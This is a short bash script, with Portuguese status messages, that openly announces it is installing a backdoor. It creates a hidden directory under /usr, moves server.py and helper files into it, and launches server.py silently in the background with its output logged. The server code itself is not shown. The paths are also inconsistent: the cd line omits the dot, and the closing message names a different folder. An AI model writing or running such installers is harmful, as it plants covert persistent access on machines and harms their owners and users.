#!/bin/bash
clear
echo "[+] Instalando Backdoor..."
mkdir /usr/.L-root
mv server.py /usr/.L-root/
mv kick_message /usr/.L-root/
mv kitty.sh /usr/.L-root/
cd /usr/L-root/
python3 /usr/.L-root/server.py >/usr/.L-root/backdoor.log 2>/usr/.L-root/backdoor.log &
echo "[+] Backdoor foi instalado com sucesso... no (/usr/.f-root)"
